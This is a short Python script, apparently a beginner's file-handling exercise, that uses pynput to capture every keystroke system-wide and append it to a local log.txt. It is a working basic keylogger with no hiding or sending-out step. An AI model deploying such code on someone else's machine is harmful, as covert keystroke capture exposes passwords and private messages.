# storing the keystroke into a text
# file handling-how to read, write and append to a file

from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.ctrl_r':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.enter':
        letter = "\n"
    if letter == 'Key.backspace':
        letter = ''
    if letter == 'Key.caps_lock':
        letter = ''

    with open("log.txt", 'a') as f:
        f.write(letter)
        


with Listener(on_press=write_to_file) as Listener:
    Listener.join()
